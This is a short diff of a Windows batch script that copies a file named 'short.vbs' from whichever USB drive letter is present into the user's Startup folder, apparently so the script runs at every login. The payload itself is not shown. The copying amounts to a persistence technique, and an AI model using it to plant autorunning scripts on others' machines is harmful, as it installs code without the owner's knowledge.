@@ -10,7 +10,7 @@ REM Henry Samuelson, Christopher Hansen
 
 REM test sources, bc we dont know what the USB drive will be named by the system
 xcopy /s D:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-xcopy /s E:\pocketwatch.txt "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+xcopy /s E:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 xcopy /s F:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 xcopy /s G:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
